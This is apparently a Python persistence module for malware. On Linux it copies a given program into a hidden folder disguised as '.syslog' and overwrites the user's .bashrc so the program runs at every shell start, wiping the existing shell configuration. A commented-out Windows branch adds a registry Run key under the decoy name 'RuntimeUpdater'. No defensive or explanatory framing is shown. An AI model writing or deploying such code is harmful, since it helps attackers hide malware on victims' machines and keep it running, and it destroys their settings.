import shutil
import platform
import os

def run(name):
    os.chdir('/tmp/')
    user = os.getlogin()
    if platform.system() == "Linux":
        def move():
            fldrpath = f"/home/{user}/.local/share/.syslog/"
            filename = os.path.basename(name)
            print(filename)
            os.makedirs(fldrpath, exist_ok=True)
            shutil.copy(name, os.path.join(fldrpath, os.path.basename(name)))
            with open(f'/home/{user}/.bashrc', 'w') as fl:
                fl.write(f'python {fldrpath}{filename}')
        move()

#    if platform.system() == "Windows":
 #       def create():
  #          key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
   #         program_name = "RuntimeUpdater"
    #        program_path = f"C:\\Users\\{user}\\AppData\\LocalLowMyApp\{name}.exe"
     #       with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
      #          reg.SetValueEx(key, program_name, 0, reg.REG_SZ, program_path)


# --- Delete ---
#with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
#    reg.DeleteValue(key, program_name)
#    print(f"Registry value deleted: {program_name}")
